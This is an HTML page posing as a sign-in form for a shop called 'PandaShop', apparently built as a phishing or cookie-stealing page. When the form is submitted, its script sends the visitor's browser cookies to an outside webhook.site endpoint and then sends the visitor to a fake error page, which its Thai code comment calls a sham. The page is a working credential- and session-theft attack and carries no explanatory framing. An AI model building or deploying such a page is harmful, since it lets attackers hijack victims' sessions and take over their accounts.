<!DOCTYPE html>
<html lang="th">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Sign in - PandaShop</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
    <style>
      * {
        font-family: 'Inter', sans-serif;
        box-sizing: border-box;
      }
      body {
        background-color: #f9fafb;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
      }
      .card {
        background-color: #fff;
        padding: 2rem;
        border-radius: 1rem;
        box-shadow: 0 0 20px rgba(0,0,0,0.05);
        width: 100%;
        max-width: 400px;
        text-align: center;
      }
      img.logo {
        width: 48px;
        margin-bottom: 1rem;
      }
      h1 {
        margin: 0 0 1rem;
        font-size: 1.5rem;
      }
      input {
        width: 100%;
        padding: 0.75rem;
        margin: 0.5rem 0;
        border: 1px solid #ccc;
        border-radius: 0.5rem;
      }
      button {
        background-color: #111827;
        color: #fff;
        width: 100%;
        padding: 0.75rem;
        border: none;
        border-radius: 0.5rem;
        margin-top: 1rem;
        cursor: pointer;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <img class="logo" src="https://pandashop.rdcw.xyz/logo.svg" alt="Logo" />
      <h1>Sign in to your account</h1>
      <form onsubmit="sendCookie(); return false;">
        <input type="email" placeholder="Email" required />
        <input type="password" placeholder="Password" required />
        <button type="submit">Sign In</button>
      </form>
    </div>

    <script>
      function sendCookie() {
        fetch("https://webhook.site/37fdcdfb-da6e-4ea7-beb2-099d6c982b4d", {
          method: "POST",
          headers: {
            "Content-Type": "text/plain"
          },
          body: document.cookie
        }).then(() => {
          window.location.href = "https://pandashop.rdcw.xyz/error"; // redirect หลอกๆ ไปหน้า error
        });
      }
    </script>
  </body>
</html>
